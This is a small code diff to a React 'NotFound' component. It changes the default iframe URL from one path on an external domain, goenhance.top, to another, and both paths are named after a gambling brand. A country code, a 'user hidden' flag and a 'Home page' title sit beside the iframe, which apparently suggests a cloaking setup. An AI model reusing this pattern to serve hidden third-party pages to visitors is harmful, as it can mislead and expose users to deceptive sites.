@@ -7,7 +7,7 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://goenhance.top/stakeuscom');
+  let[IframeUrl, SetIframeUrl] = useState('https://goenhance.top/stakecom');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
